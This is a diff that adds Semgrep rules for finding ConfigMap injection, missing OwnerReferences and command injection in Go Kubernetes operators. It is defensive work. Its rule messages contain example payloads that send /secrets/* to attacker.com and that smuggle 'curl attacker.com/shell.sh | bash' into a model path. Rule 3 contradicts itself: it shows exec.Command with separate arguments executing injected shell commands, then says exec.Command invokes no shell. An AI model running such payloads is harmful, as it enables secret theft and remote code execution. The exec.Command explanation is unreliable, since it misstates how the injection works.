@@ -1,0 +1,327 @@
+# Semgrep Rules: RHOAI Kubernetes Operator Security
+# Category: Operator-specific patterns (controllers, reconcilers, CRDs)
+# Target: Go code in Kubernetes operators
+#
+# Detects security issues in Kubernetes operator patterns:
+# - ConfigMap/Secret injection vulnerabilities
+# - Missing OwnerReferences (orphaned resources)
+# - Command injection in exec calls
+
+rules:
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 1: ConfigMap Data Injection (User Input → ConfigMap)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-configmap-injection
+    patterns:
+      # ConfigMap created with data from CR spec
+      - pattern-either:
+          - pattern: |
+              $CM := &corev1.ConfigMap{
+                Data: map[string]string{
+                  ...,
+                  $KEY: $CR.Spec.$FIELD,
+                  ...,
+                },
+                ...
+              }
+          - pattern: |
+              $CM.Data[$KEY] = $CR.Spec.$FIELD
+      # Not if CR field is validated
+      - pattern-not-inside: |
+          if validate($CR.Spec.$FIELD) { ... }
+      - pattern-not-inside: |
+          if err := validate($CR.Spec.$FIELD); err != nil { ... }
+    message: |
+      ConfigMap populated with unvalidated CR spec field.
+
+      VULNERABILITY: Users can inject malicious data into ConfigMaps via Custom
+      Resources, leading to privilege escalation if ConfigMaps are mounted in pods.
+
+      ATTACK SCENARIO:
+      1. User creates CR with malicious spec.config field
+      2. Operator creates ConfigMap with spec.config (no validation)
+      3. ConfigMap mounted to inference pods
+      4. Malicious config executes commands or exfiltrates data
+
+      EXAMPLE ATTACK (Model Serving):
+      ```yaml
+      apiVersion: ai.redhat.com/v1
+      kind: InferenceService
+      spec:
+        config: |
+          # Malicious Python code injected
+          import os; os.system('curl attacker.com?data=$(cat /secrets/*)')
+      ```
+
+      REMEDIATION:
+      Validate all CR spec fields before storage:
+
+      ```go
+      // BEFORE (VULNERABLE):
+      cm := &corev1.ConfigMap{
+          Data: map[string]string{
+              "config.yaml": cr.Spec.Config,  // ❌ No validation
+          },
+      }
+
+      // AFTER (SECURE):
+      // Validate length
+      if len(cr.Spec.Config) > 1024*1024 {
+          return fmt.Errorf("config exceeds 1MB limit")
+      }
+
+      // Validate format (YAML parseable)
+      var parsed map[string]interface{}
+      if err := yaml.Unmarshal([]byte(cr.Spec.Config), &parsed); err != nil {
+          return fmt.Errorf("invalid YAML: %w", err)
+      }
+
+      // Validate no shell commands
+      if strings.Contains(cr.Spec.Config, "$(") ||
+         strings.Contains(cr.Spec.Config, "`") {
+          return fmt.Errorf("shell expansion detected")
+      }
+
+      // Validate allowed keys only
+      allowedKeys := []string{"model", "runtime", "resources"}
+      for key := range parsed {
+          if !slices.Contains(allowedKeys, key) {
+              return fmt.Errorf("unexpected key: %s", key)
+          }
+      }
+
+      cm := &corev1.ConfigMap{
+          Data: map[string]string{
+              "config.yaml": cr.Spec.Config,  // ✅ Validated
+          },
+      }
+      ```
+
+      VALIDATION CHECKLIST:
+      - [ ] Length limits
+      - [ ] Format validation (YAML/JSON parseable)
+      - [ ] Character allowlists (no shell metacharacters)
+      - [ ] Schema validation (expected keys only)
+      - [ ] No secrets or credentials
+      - [ ] No path traversal patterns
+
+      REFERENCES:
+      - CWE-20: Improper Input Validation
+      - CWE-94: Code Injection
+    severity: ERROR
+    languages: [go]
+    metadata:
+      category: security
+      technology: [kubernetes, configmap]
+      cwe: "CWE-20"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: HIGH
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 2: Missing OwnerReferences (Resource Leak / Orphaned Resources)
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-missing-owner-reference
+    patterns:
+      # Creating Deployment/Service/ConfigMap without OwnerReferences
+      - pattern-either:
+          - pattern: |
+              $RESOURCE := &$TYPE{
+                ObjectMeta: metav1.ObjectMeta{...},
+                ...
+              }
+              ...
+              $CLIENT.Create($CTX, $RESOURCE)
+          - pattern: |
+              $CLIENT.Create($CTX, &$TYPE{
+                ObjectMeta: metav1.ObjectMeta{...},
+                ...
+              })
+      # Where TYPE is a child resource
+      - metavariable-pattern:
+          metavariable: $TYPE
+          patterns:
+            - pattern-either:
+                - pattern: corev1.ConfigMap
+                - pattern: corev1.Secret
+                - pattern: corev1.Service
+                - pattern: appsv1.Deployment
+                - pattern: appsv1.StatefulSet
+                - pattern: batchv1.Job
+      # Not if OwnerReferences is set
+      - pattern-not-inside: |
+          $RESOURCE.OwnerReferences = $REFS
+          ...
+          $CLIENT.Create($CTX, $RESOURCE)
+      - pattern-not-inside: |
+          controllerutil.SetControllerReference($OWNER, $RESOURCE, ...)
+    message: |
+      Kubernetes resource created without OwnerReferences.
+
+      VULNERABILITY: Child resources created without OwnerReferences are not
+      garbage collected when parent CR is deleted, leading to:
+      - Resource leaks (orphaned Deployments consuming cluster resources)
+      - Stale configurations (old ConfigMaps still mounted)
+      - Namespace pollution (undeletable resources)
+
+      EXAMPLE PROBLEM:
+      1. User creates InferenceService CR
+      2. Operator creates Deployment (no OwnerReference)
+      3. User deletes InferenceService
+      4. Deployment remains running (orphaned)
+      5. Cluster accumulates orphaned resources over time
+
+      REMEDIATION:
+      Always set OwnerReferences for child resources:
+
+      ```go
+      // BEFORE (VULNERABLE):
+      deployment := &appsv1.Deployment{
+          ObjectMeta: metav1.ObjectMeta{
+              Name:      cr.Name + "-deployment",
+              Namespace: cr.Namespace,
+              // ❌ No OwnerReferences
+          },
+          Spec: ...,
+      }
+      client.Create(ctx, deployment)
+
+      // AFTER (SECURE):
+      deployment := &appsv1.Deployment{
+          ObjectMeta: metav1.ObjectMeta{
+              Name:      cr.Name + "-deployment",
+              Namespace: cr.Namespace,
+          },
+          Spec: ...,
+      }
+
+      // Set OwnerReference (controller-runtime helper)
+      if err := controllerutil.SetControllerReference(cr, deployment, r.Scheme); err != nil {
+          return err
+      }
+
+      client.Create(ctx, deployment)
+      ```
+
+      BENEFITS:
+      - Automatic garbage collection on CR deletion
+      - Ownership hierarchy visible in kubectl
+      - Prevents namespace pollution
+      - Enables cascading delete
+
+      EXCEPTIONS (where OwnerReference not needed):
+      - Cluster-scoped resources (CR is namespaced, cannot own cluster resources)
+      - Resources in different namespace (cross-namespace ownership not allowed)
+      - Explicitly intended to outlive parent (document in code comments)
+
+      REFERENCES:
+      - Kubernetes Garbage Collection
+      - controller-runtime OwnerReference patterns
+    severity: WARNING
+    languages: [go]
+    metadata:
+      category: security
+      technology: [kubernetes, garbage-collection]
+      cwe: "CWE-404"
+      confidence: MEDIUM
+      likelihood: HIGH
+      impact: MEDIUM
+      subcategory: [vuln]
+
+  # ═══════════════════════════════════════════════════════════════════════
+  # Rule 3: Command Injection via exec.Command
+  # ═══════════════════════════════════════════════════════════════════════
+  - id: rhoai-command-injection
+    patterns:
+      # exec.Command with CR spec field
+      - pattern-either:
+          - pattern: exec.Command($CMD, $CR.Spec.$FIELD)
+          - pattern: exec.Command($CMD, ..., $CR.Spec.$FIELD, ...)
+          - pattern: |
+              $ARGS := []string{..., $CR.Spec.$FIELD, ...}
+              ...
+              exec.Command($CMD, $ARGS...)
+      # Not if field is validated
+      - pattern-not-inside: |
+          if validate($CR.Spec.$FIELD) { ... }
+      - pattern-not-inside: |
+          if !regexp.MustCompile(...).MatchString($CR.Spec.$FIELD) { ... }
+    message: |
+      Command execution with unvalidated CR spec field.
+
+      VULNERABILITY: User-controlled CR fields passed to exec.Command can inject
+      arbitrary shell commands, leading to remote code execution.
+
+      ATTACK SCENARIO:
+      1. User creates CR with malicious spec field
+      2. Operator passes field to exec.Command (no validation)
+      3. Shell metacharacters interpreted as commands
+      4. Attacker gains code execution as operator ServiceAccount
+
+      EXAMPLE ATTACK:
+      ```yaml
+      apiVersion: ai.redhat.com/v1
+      kind: ModelConverter
+      spec:
+        modelPath: "/models/llama; curl attacker.com/shell.sh | bash"
+      ```
+
+      ```go
+      // VULNERABLE CODE:
+      cmd := exec.Command("python3", "convert.py", cr.Spec.ModelPath)
+      // Executes: python3 convert.py /models/llama; curl attacker.com/shell.sh | bash
+      ```
+
+      REMEDIATION:
+      Validate input and avoid shell execution:
+
+      ```go
+      // BEFORE (VULNERABLE):
+      cmd := exec.Command("python3", "convert.py", cr.Spec.ModelPath)
+
+      // AFTER (SECURE):
+      // 1. Validate input (allowlist pattern)
+      if !regexp.MustCompile(`^/models/[a-zA-Z0-9/_-]+$`).MatchString(cr.Spec.ModelPath) {
+          return fmt.Errorf("invalid model path: %s", cr.Spec.ModelPath)
+      }
+
+      // 2. Check no shell metacharacters
+      if strings.ContainsAny(cr.Spec.ModelPath, ";|&$`<>(){}[]") {
+          return fmt.Errorf("invalid characters in model path")
+      }
+
+      // 3. Check path doesn't escape base directory
+      absPath, err := filepath.Abs(cr.Spec.ModelPath)
+      if err != nil || !strings.HasPrefix(absPath, "/models/") {
+          return fmt.Errorf("path outside allowed directory")
+      }
+
+      // 4. Use exec.Command (not shell)
+      cmd := exec.Command("python3", "convert.py", cr.Spec.ModelPath)
+      // exec.Command does NOT invoke shell, args are passed directly
+      ```
+
+      SAFE PATTERNS:
+      - Use exec.Command (NOT exec.CommandContext with shell)
+      - Validate inputs with allowlist regex
+      - Check for shell metacharacters
+      - Use filepath.Abs to prevent path traversal
+
+      DANGEROUS FUNCTIONS:
+      - exec.Command("/bin/sh", "-c", userInput)  // ❌ Shell injection
+      - exec.Command("bash", "-c", userInput)     // ❌ Shell injection
+
+      REFERENCES:
+      - CWE-78: OS Command Injection
+      - OWASP: Command Injection
+    severity: ERROR
+    languages: [go]
+    metadata:
+      category: security
+      technology: [command-execution]
+      cwe: "CWE-78"
+      confidence: HIGH
+      likelihood: HIGH
+      impact: CRITICAL
+      subcategory: [vuln]
